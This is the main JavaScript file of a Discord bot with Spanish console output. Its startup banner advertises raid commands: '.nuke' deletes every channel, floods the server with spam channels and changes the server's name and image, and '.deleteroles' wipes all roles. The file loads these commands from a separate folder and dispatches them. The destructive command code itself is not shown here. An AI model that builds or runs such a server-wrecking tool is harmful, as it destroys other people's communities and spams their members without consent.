const Discord = require("discord.js");
const fs = require('fs');
const chalk = require('chalk');
const { green } = require('chalk');

const client = new Discord.Client();
client.commands = new Discord.Collection();

const commandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js'));

const {
    prefix,
    token,
} = require('./config.json');
client.once('ready', () => {
    console.log((chalk.green(`Logeado como ${client.user.tag}`)));
    console.log((chalk.red(`__________.__        ____  ___       `)));
    console.log((chalk.red(`\\______   \\  |   ____\\   \\/  /___  ___`)));
    console.log((chalk.yellow(` |     ___/  |  /  _ \\     / \\  \\/  /`)));
    console.log((chalk.yellow(` |    |   |  |_(  <_> )     \\  >    < `)));
    console.log((chalk.red(` |____|   |____/\\____/___/\\  \\/__/\\_ \\ `)));
    console.log((chalk.red(`                           \\_/      \\/`)));
    console.log((green('-----------COMANDOS-----------')));
    console.log((chalk.green('[+].nuke => Borra todos los canales, crea nuevos con spam y cambia la imagen y nombre del servidor')));
    console.log((chalk.green('[+].deleteroles => borra todos los roles del servidor')));
    console.log((chalk.green('[+].createroles => crea nuevos roles ')));
    console.log((chalk.green('==================================================')));
});

client.login(token);

for (const file of commandFiles) {
    const command = require(`./commands/${file}`);
    client.commands.set(command.name, command);
}
client.on('message', message => {
    if (!message.content.startsWith(prefix) || message.author.bot) return;

    const args = message.content.slice(prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if(!client.commands.has(command)) return;
    try{
        client.commands.get(command).execute(message, args);
    }catch(error){
        console.error(error);
        message.reply("Hubo un problema al ejecutar ese comando");
    }
});